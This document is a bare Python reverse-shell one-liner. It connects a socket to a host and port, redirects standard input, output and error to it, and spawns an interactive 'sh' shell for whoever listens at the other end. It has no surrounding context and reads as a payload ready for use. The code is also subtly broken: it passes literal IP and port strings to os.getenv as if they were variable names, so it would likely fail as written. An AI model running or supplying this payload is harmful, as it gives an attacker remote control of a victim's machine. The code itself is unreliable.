import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("127.0.0.1"),int(os.getenv("9000"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")